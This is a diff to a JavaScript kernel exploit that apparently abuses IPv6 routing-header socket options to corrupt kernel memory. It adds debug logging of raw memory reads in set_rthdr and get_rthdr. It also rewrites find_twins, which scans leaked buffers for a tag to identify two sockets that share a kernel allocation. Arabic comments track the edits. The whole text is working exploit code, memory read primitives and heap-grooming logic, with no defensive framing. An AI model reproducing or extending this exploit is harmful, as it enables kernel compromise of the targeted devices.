@@ -237,16 +237,25 @@ function get_sockopt(sd, level, optname, optval, optlen) {
   return read32(sockopt_len_ptr);
 }
 function set_rthdr(sd, buf, len) {
-  return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
-  // debug("set_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
-  // debug("Called with buf: " + hex(read64(buf)) + " len: " + hex(len));
-  // return ret;
+  log("[SET] sd=" + sd + " len=" + len);
+  log("[SET] first dword=" + hex(read32(buf)));
+
+  let ret = set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
+
+  log("[SET] ret=" + ret);
+  return ret;
 }
 function get_rthdr(sd, buf, max_len) {
-  return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
-  // debug("get_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
-  // debug("Result buf: " + hex(read64(buf)) + " max_len: " + hex(max_len));
-  // return ret;
+  let ret = get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
+
+  log("[GET] sd=" + sd + " ret=" + ret);
+
+  for (let off = 0; off < max_len; off += 4) {
+    log("[GET] off=0x" + off.toString(16) +
+        " val=0x" + hex(read32(buf.add(off))));
+  }
+
+  return ret;
 }
 function free_rthdrs(sds) {
   for (var sd of sds) {
@@ -796,16 +805,15 @@ function find_twins() {
     }
     for (i = 0; i < ipv6_socks.length; i++) {
       if (ipv6_socks[i].eq(BigInt_Error)) continue;
-
-      write32(leak_add, 0);
-
-      // كبّر الطول مؤقتًا عشان نلقط أكتر من فيلد
-      get_rthdr(ipv6_socks[i], leak_rthdr, 32);
-
-      // اطبع أول 32 بايت كـ dwords
-      for (var off = 0; off < 32; off += 4) {
-        var v = read32(leak_rthdr.add(off));
-        log("i=" + i + " off=0x" + off.toString(16) + " val=0x" + hex(v));
+      write32(leak_add, 0); // تعديل رقم 4
+      get_rthdr(ipv6_socks[i], leak_rthdr, 8);
+      val = read32(leak_add);
+      j = val & 0xFFFF;
+      if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j >= 0 && j < ipv6_socks.length) {
+        twins[0] = i;
+        twins[1] = j;
+        log(' TWINS : [' + i + '] [' + j + ']');
+        return true;
       }
     }
     count++;
